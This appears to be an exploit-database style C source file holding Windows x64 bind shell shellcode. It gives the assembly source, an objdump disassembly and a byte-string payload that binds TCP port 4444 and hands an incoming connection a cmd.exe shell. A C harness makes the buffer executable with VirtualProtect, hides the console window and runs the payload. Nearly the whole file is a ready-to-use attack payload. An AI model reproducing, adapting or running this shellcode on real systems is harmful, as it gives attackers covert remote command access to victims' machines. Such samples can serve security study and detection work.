/*
	# Title : Windows x64 Bind Shell TCP Shellcode
	# size : 508 bytes
	# Date : 08-12-2016
	# Author : Roziul Hasan Khan Shifat
	# Tested On : Windows 7 Professional x64



*/


/*

section .text
	global _start
_start:

xor rdx,rdx
mov rax,[gs:rdx+0x60]
mov rsi,[rax+0x18]
mov rsi,[rsi+0x10]
lodsq
mov rsi,[rax]
mov r14,[rsi+0x30]

;----------------------
mov dl,0x88
mov ebx,[r14+0x3c]
add rbx,r14
mov ebx,[rbx+rdx]
add rbx,r14

;--------------------------
mov esi,[rbx+0x1c]
add rsi,r14 ;kernel32.dll base address

;-------------------------------

mov dx,832
mov ebx,[rsi+rdx*4]
add rbx,r14 ;LoadLibraryA()
;-------------------------------


mov dl,128
sub rsp,rdx
lea r12,[rsp]

;----------------------------------------------------

;loading ws2_32.dll



xor rdx,rdx



mov [r12],dword 'ws2_'
mov [r12+4],word '32'
mov [r12+6],byte dl

lea rcx,[r12]

sub rsp,88

call rbx

mov r15,rax ;ws2_32.dll base address
;--------------------------------------------------
xor rdx,rdx
mov dl,0x88
mov ebx,[r15+0x3c]
add rbx,r15
mov ebx,[rbx+rdx]
add rbx,r15

mov edi,[rbx+0x1c]
add rdi,r15

;------------------------------


mov dx,114*4
mov ebx,[rdi+rdx]
add rbx,r15 ;WSAStartup()

;-----------------------------------
;WSAStartup(514,&WSADATA)




xor rcx,rcx
mov cx,408


sub rsp,rcx
lea rdx,[rsp]
mov cx,514

sub rsp,88

call rbx


;-------------------------------------------
xor rdx,rdx
mov dx,98*4
mov ebx,[rdi+rdx]
add rbx,r15 ;WSASocketA()

;WSASocket(2,1,6,0,0,0)

push 6
push 1
push 2

pop rcx
pop rdx
pop r8

xor r9,r9

mov [rsp+32],r9
mov [rsp+40],r9

call rbx

mov r13,rax ;SOCKET
;--------------------------------------------
mov ebx,[rdi+80]
add rbx,r15 ;setsockopt()

;setsockopt(SOCKET,0xffff,4,&1,4)
xor rdx,rdx
mov rcx,r13
mov dx,0xffff

push 4

pop r8

mov [rsp],byte 1
lea r9,[rsp]

sub rsp,88
mov  [rsp+32],r8

call rbx

;--------------------------------------------------
mov ebx,[rdi+4]
add rbx,r15 ;bind()

;bind(SOCKET,(struct sockaddr *)&struct sockaddr_in,16)


push 16
pop r8

xor rdx,rdx

mov [r12],rdx
mov [r12+8],rdx

mov [r12],byte 2
mov [r12+2],word 0x5c11 ;port 4444 (change it if U want)
lea rdx,[r12]

mov rcx,r13

call rbx
;----------------------------------------

mov ebx,[rdi+48]
add rbx,r15 ;listen()


;listen(SOCKET,1)

push 1
pop rdx

push r13
pop rcx

call rbx

;-----------------------------------

mov ebx,[rdi]
add rbx,r15 ;accept()

;accept(SOCKET,(struct sockaddr *)&struct sockaddr_in,16)

xor rdx,rdx

mov [r12],rdx
mov [r12+8],rdx

mov dl,16
push rdx

lea r8,[rsp]


lea rdx,[r12]

mov rcx,r13

sub rsp,88
call rbx

;-------------------------------------------
xor rdx,rdx
mov [r12],rdx
mov [r12+8],rdx





mov dl,104

xor rcx,rcx
mov [r12],dword edx
mov [r12+4],rcx
mov [r12+12],rcx
mov [r12+20],rcx
mov [r12+24],rcx

mov dl,255
inc rdx

mov [r12+0x3c],edx
mov [r12+0x50],rax
mov [r12+0x58],rax
mov [r12+0x60],rax

;--------------------------------------------------

mov [r12-4],dword 'cmdA'
mov [r12-1],byte cl

;-----------------------------------------
sub rsp,88
;CreateProcessA(NULL,"cmd",NULL,NULL,TRUE,0,NULL,NULL,&STARTUPINFOA,&PROCESS_INFOMATION)

lea rdx,[r12-4] ;"cmd"

xor r8,r8 ;NULL

push r8
pop r9 ;NULL

mov [rsp+32],byte 1 ;TRUE
mov [rsp+40],r8 ;0
mov [rsp+48],r8 ;NULL
mov [rsp+56],r8 ;NULL


lea rax,[r12]
mov [rsp+64],rax

lea rax,[r12+104]
mov [rsp+72],rax

xor r10,r10
mov r10w,165*4
mov ebx,[rsi+r10]
add rbx,r14 ;CreateProcessA()

call rbx

;-----------------------------------------------




mov r10w,297*4
mov ebx,[rsi+r10]
add rbx,r14

push 1
pop rcx

add rsp,88
call rbx




*/



/*


     file format pe-x86-64


Disassembly of section .text:

0000000000000000 <_start>:
   0:	48 31 d2             	xor    %rdx,%rdx
   3:	65 48 8b 42 60       	mov    %gs:0x60(%rdx),%rax
   8:	48 8b 70 18          	mov    0x18(%rax),%rsi
   c:	48 8b 76 10          	mov    0x10(%rsi),%rsi
  10:	48 ad                	lods   %ds:(%rsi),%rax
  12:	48 8b 30             	mov    (%rax),%rsi
  15:	4c 8b 76 30          	mov    0x30(%rsi),%r14
  19:	b2 88                	mov    $0x88,%dl
  1b:	41 8b 5e 3c          	mov    0x3c(%r14),%ebx
  1f:	4c 01 f3             	add    %r14,%rbx
  22:	8b 1c 13             	mov    (%rbx,%rdx,1),%ebx
  25:	4c 01 f3             	add    %r14,%rbx
  28:	8b 73 1c             	mov    0x1c(%rbx),%esi
  2b:	4c 01 f6             	add    %r14,%rsi
  2e:	66 ba 40 03          	mov    $0x340,%dx
  32:	8b 1c 96             	mov    (%rsi,%rdx,4),%ebx
  35:	4c 01 f3             	add    %r14,%rbx
  38:	b2 80                	mov    $0x80,%dl
  3a:	48 29 d4             	sub    %rdx,%rsp
  3d:	4c 8d 24 24          	lea    (%rsp),%r12
  41:	48 31 d2             	xor    %rdx,%rdx
  44:	41 c7 04 24 77 73 32 	movl   $0x5f327377,(%r12)
  4b:	5f
  4c:	66 41 c7 44 24 04 33 	movw   $0x3233,0x4(%r12)
  53:	32
  54:	41 88 54 24 06       	mov    %dl,0x6(%r12)
  59:	49 8d 0c 24          	lea    (%r12),%rcx
  5d:	48 83 ec 58          	sub    $0x58,%rsp
  61:	ff d3                	callq  *%rbx
  63:	49 89 c7             	mov    %rax,%r15
  66:	48 31 d2             	xor    %rdx,%rdx
  69:	b2 88                	mov    $0x88,%dl
  6b:	41 8b 5f 3c          	mov    0x3c(%r15),%ebx
  6f:	4c 01 fb             	add    %r15,%rbx
  72:	8b 1c 13             	mov    (%rbx,%rdx,1),%ebx
  75:	4c 01 fb             	add    %r15,%rbx
  78:	8b 7b 1c             	mov    0x1c(%rbx),%edi
  7b:	4c 01 ff             	add    %r15,%rdi
  7e:	66 ba c8 01          	mov    $0x1c8,%dx
  82:	8b 1c 17             	mov    (%rdi,%rdx,1),%ebx
  85:	4c 01 fb             	add    %r15,%rbx
  88:	48 31 c9             	xor    %rcx,%rcx
  8b:	66 b9 98 01          	mov    $0x198,%cx
  8f:	48 29 cc             	sub    %rcx,%rsp
  92:	48 8d 14 24          	lea    (%rsp),%rdx
  96:	66 b9 02 02          	mov    $0x202,%cx
  9a:	48 83 ec 58          	sub    $0x58,%rsp
  9e:	ff d3                	callq  *%rbx
  a0:	48 31 d2             	xor    %rdx,%rdx
  a3:	66 ba 88 01          	mov    $0x188,%dx
  a7:	8b 1c 17             	mov    (%rdi,%rdx,1),%ebx
  aa:	4c 01 fb             	add    %r15,%rbx
  ad:	6a 06                	pushq  $0x6
  af:	6a 01                	pushq  $0x1
  b1:	6a 02                	pushq  $0x2
  b3:	59                   	pop    %rcx
  b4:	5a                   	pop    %rdx
  b5:	41 58                	pop    %r8
  b7:	4d 31 c9             	xor    %r9,%r9
  ba:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
  bf:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
  c4:	ff d3                	callq  *%rbx
  c6:	49 89 c5             	mov    %rax,%r13
  c9:	8b 5f 50             	mov    0x50(%rdi),%ebx
  cc:	4c 01 fb             	add    %r15,%rbx
  cf:	48 31 d2             	xor    %rdx,%rdx
  d2:	4c 89 e9             	mov    %r13,%rcx
  d5:	66 ba ff ff          	mov    $0xffff,%dx
  d9:	6a 04                	pushq  $0x4
  db:	41 58                	pop    %r8
  dd:	c6 04 24 01          	movb   $0x1,(%rsp)
  e1:	4c 8d 0c 24          	lea    (%rsp),%r9
  e5:	48 83 ec 58          	sub    $0x58,%rsp
  e9:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
  ee:	ff d3                	callq  *%rbx
  f0:	8b 5f 04             	mov    0x4(%rdi),%ebx
  f3:	4c 01 fb             	add    %r15,%rbx
  f6:	6a 10                	pushq  $0x10
  f8:	41 58                	pop    %r8
  fa:	48 31 d2             	xor    %rdx,%rdx
  fd:	49 89 14 24          	mov    %rdx,(%r12)
 101:	49 89 54 24 08       	mov    %rdx,0x8(%r12)
 106:	41 c6 04 24 02       	movb   $0x2,(%r12)
 10b:	66 41 c7 44 24 02 11 	movw   $0x5c11,0x2(%r12)
 112:	5c
 113:	49 8d 14 24          	lea    (%r12),%rdx
 117:	4c 89 e9             	mov    %r13,%rcx
 11a:	ff d3                	callq  *%rbx
 11c:	8b 5f 30             	mov    0x30(%rdi),%ebx
 11f:	4c 01 fb             	add    %r15,%rbx
 122:	6a 01                	pushq  $0x1
 124:	5a                   	pop    %rdx
 125:	41 55                	push   %r13
 127:	59                   	pop    %rcx
 128:	ff d3                	callq  *%rbx
 12a:	8b 1f                	mov    (%rdi),%ebx
 12c:	4c 01 fb             	add    %r15,%rbx
 12f:	48 31 d2             	xor    %rdx,%rdx
 132:	49 89 14 24          	mov    %rdx,(%r12)
 136:	49 89 54 24 08       	mov    %rdx,0x8(%r12)
 13b:	b2 10                	mov    $0x10,%dl
 13d:	52                   	push   %rdx
 13e:	4c 8d 04 24          	lea    (%rsp),%r8
 142:	49 8d 14 24          	lea    (%r12),%rdx
 146:	4c 89 e9             	mov    %r13,%rcx
 149:	48 83 ec 58          	sub    $0x58,%rsp
 14d:	ff d3                	callq  *%rbx
 14f:	48 31 d2             	xor    %rdx,%rdx
 152:	49 89 14 24          	mov    %rdx,(%r12)
 156:	49 89 54 24 08       	mov    %rdx,0x8(%r12)
 15b:	b2 68                	mov    $0x68,%dl
 15d:	48 31 c9             	xor    %rcx,%rcx
 160:	41 89 14 24          	mov    %edx,(%r12)
 164:	49 89 4c 24 04       	mov    %rcx,0x4(%r12)
 169:	49 89 4c 24 0c       	mov    %rcx,0xc(%r12)
 16e:	49 89 4c 24 14       	mov    %rcx,0x14(%r12)
 173:	49 89 4c 24 18       	mov    %rcx,0x18(%r12)
 178:	b2 ff                	mov    $0xff,%dl
 17a:	48 ff c2             	inc    %rdx
 17d:	41 89 54 24 3c       	mov    %edx,0x3c(%r12)
 182:	49 89 44 24 50       	mov    %rax,0x50(%r12)
 187:	49 89 44 24 58       	mov    %rax,0x58(%r12)
 18c:	49 89 44 24 60       	mov    %rax,0x60(%r12)
 191:	41 c7 44 24 fc 63 6d 	movl   $0x41646d63,-0x4(%r12)
 198:	64 41
 19a:	41 88 4c 24 ff       	mov    %cl,-0x1(%r12)
 19f:	48 83 ec 58          	sub    $0x58,%rsp
 1a3:	49 8d 54 24 fc       	lea    -0x4(%r12),%rdx
 1a8:	4d 31 c0             	xor    %r8,%r8
 1ab:	41 50                	push   %r8
 1ad:	41 59                	pop    %r9
 1af:	c6 44 24 20 01       	movb   $0x1,0x20(%rsp)
 1b4:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
 1b9:	4c 89 44 24 30       	mov    %r8,0x30(%rsp)
 1be:	4c 89 44 24 38       	mov    %r8,0x38(%rsp)
 1c3:	49 8d 04 24          	lea    (%r12),%rax
 1c7:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
 1cc:	49 8d 44 24 68       	lea    0x68(%r12),%rax
 1d1:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
 1d6:	4d 31 d2             	xor    %r10,%r10
 1d9:	66 41 ba 94 02       	mov    $0x294,%r10w
 1de:	42 8b 1c 16          	mov    (%rsi,%r10,1),%ebx
 1e2:	4c 01 f3             	add    %r14,%rbx
 1e5:	ff d3                	callq  *%rbx
 1e7:	66 41 ba a4 04       	mov    $0x4a4,%r10w
 1ec:	42 8b 1c 16          	mov    (%rsi,%r10,1),%ebx
 1f0:	4c 01 f3             	add    %r14,%rbx
 1f3:	6a 01                	pushq  $0x1
 1f5:	59                   	pop    %rcx
 1f6:	48 83 c4 58          	add    $0x58,%rsp
 1fa:	ff d3                	callq  *%rbx





*/









#include<windows.h>
#include<stdio.h>
#include<string.h>


char shellcode[]=\

"\x48\x31\xd2\x65\x48\x8b\x42\x60\x48\x8b\x70\x18\x48\x8b\x76\x10\x48\xad\x48\x8b\x30\x4c\x8b\x76\x30\xb2\x88\x41\x8b\x5e\x3c\x4c\x01\xf3\x8b\x1c\x13\x4c\x01\xf3\x8b\x73\x1c\x4c\x01\xf6\x66\xba\x40\x03\x8b\x1c\x96\x4c\x01\xf3\xb2\x80\x48\x29\xd4\x4c\x8d\x24\x24\x48\x31\xd2\x41\xc7\x04\x24\x77\x73\x32\x5f\x66\x41\xc7\x44\x24\x04\x33\x32\x41\x88\x54\x24\x06\x49\x8d\x0c\x24\x48\x83\xec\x58\xff\xd3\x49\x89\xc7\x48\x31\xd2\xb2\x88\x41\x8b\x5f\x3c\x4c\x01\xfb\x8b\x1c\x13\x4c\x01\xfb\x8b\x7b\x1c\x4c\x01\xff\x66\xba\xc8\x01\x8b\x1c\x17\x4c\x01\xfb\x48\x31\xc9\x66\xb9\x98\x01\x48\x29\xcc\x48\x8d\x14\x24\x66\xb9\x02\x02\x48\x83\xec\x58\xff\xd3\x48\x31\xd2\x66\xba\x88\x01\x8b\x1c\x17\x4c\x01\xfb\x6a\x06\x6a\x01\x6a\x02\x59\x5a\x41\x58\x4d\x31\xc9\x4c\x89\x4c\x24\x20\x4c\x89\x4c\x24\x28\xff\xd3\x49\x89\xc5\x8b\x5f\x50\x4c\x01\xfb\x48\x31\xd2\x4c\x89\xe9\x66\xba\xff\xff\x6a\x04\x41\x58\xc6\x04\x24\x01\x4c\x8d\x0c\x24\x48\x83\xec\x58\x4c\x89\x44\x24\x20\xff\xd3\x8b\x5f\x04\x4c\x01\xfb\x6a\x10\x41\x58\x48\x31\xd2\x49\x89\x14\x24\x49\x89\x54\x24\x08\x41\xc6\x04\x24\x02\x66\x41\xc7\x44\x24\x02\x11\x5c\x49\x8d\x14\x24\x4c\x89\xe9\xff\xd3\x8b\x5f\x30\x4c\x01\xfb\x6a\x01\x5a\x41\x55\x59\xff\xd3\x8b\x1f\x4c\x01\xfb\x48\x31\xd2\x49\x89\x14\x24\x49\x89\x54\x24\x08\xb2\x10\x52\x4c\x8d\x04\x24\x49\x8d\x14\x24\x4c\x89\xe9\x48\x83\xec\x58\xff\xd3\x48\x31\xd2\x49\x89\x14\x24\x49\x89\x54\x24\x08\xb2\x68\x48\x31\xc9\x41\x89\x14\x24\x49\x89\x4c\x24\x04\x49\x89\x4c\x24\x0c\x49\x89\x4c\x24\x14\x49\x89\x4c\x24\x18\xb2\xff\x48\xff\xc2\x41\x89\x54\x24\x3c\x49\x89\x44\x24\x50\x49\x89\x44\x24\x58\x49\x89\x44\x24\x60\x41\xc7\x44\x24\xfc\x63\x6d\x64\x41\x41\x88\x4c\x24\xff\x48\x83\xec\x58\x49\x8d\x54\x24\xfc\x4d\x31\xc0\x41\x50\x41\x59\xc6\x44\x24\x20\x01\x4c\x89\x44\x24\x28\x4c\x89\x44\x24\x30\x4c\x89\x44\x24\x38\x49\x8d\x04\x24\x48\x89\x44\x24\x40\x49\x8d\x44\x24\x68\x48\x89\x44\x24\x48\x4d\x31\xd2\x66\x41\xba\x94\x02\x42\x8b\x1c\x16\x4c\x01\xf3\xff\xd3\x66\x41\xba\xa4\x04\x42\x8b\x1c\x16\x4c\x01\xf3\x6a\x01\x59\x48\x83\xc4\x58\xff\xd3";


int main()
{
int len=strlen(shellcode);
DWORD l=0;
printf("shellcode length : %d\n",len);

//making memory executbale
VirtualProtect(shellcode,len,PAGE_EXECUTE_READWRITE,&l);


//hiding windows

AllocConsole();
ShowWindow(FindWindowA("ConsoleWindowClass",NULL),0);

//

(* (int(*)()) shellcode)();

return 0;

}